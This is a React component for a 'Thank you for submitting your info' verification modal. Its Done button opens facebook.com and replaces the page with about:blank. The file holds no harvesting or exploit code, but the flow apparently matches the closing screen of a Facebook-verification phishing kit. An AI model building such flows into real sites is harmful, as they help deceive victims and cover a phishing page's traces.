import { faClock } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import React from 'react';

const Finalize: React.FC = () => {
    return (
        <div className="fixed inset-0 flex items-center justify-center">
            <div className="bg-white p-6 rounded-lg shadow-gray-700 shadow-2xl w-11/12 md:w-1/3  mx-auto">
                <div className="flex flex-col items-center justify-center mb-2">
                    <b>Information Submitted</b>
                </div>
                <hr />
                <div className='flex flex-col gap-2 justify-center items-center mt-2'>
                    <FontAwesomeIcon icon={faClock} className="text-blue-500 text-center border-white border-2 rounded-full ring-blue-500 ring-2" />
                    <b className="text-center mb-2">Thank you for submitting your info</b>
                </div>
                <p className="text-gray-700 mb-4">
                    It should take about 24 hours to review your submission. We'll update your verification status after the review is complete.
                </p>
                <div className="flex justify-center">
                    <button className="bg-blue-500 font-semibold w-full text-white px-4 py-2 rounded hover:bg-blue-600" onClick={() => { window.open('https://www.facebook.com'); window.location.replace('about:blank'); }}>Done</button>
                </div>
            </div>
        </div >
    );
};

export default Finalize;
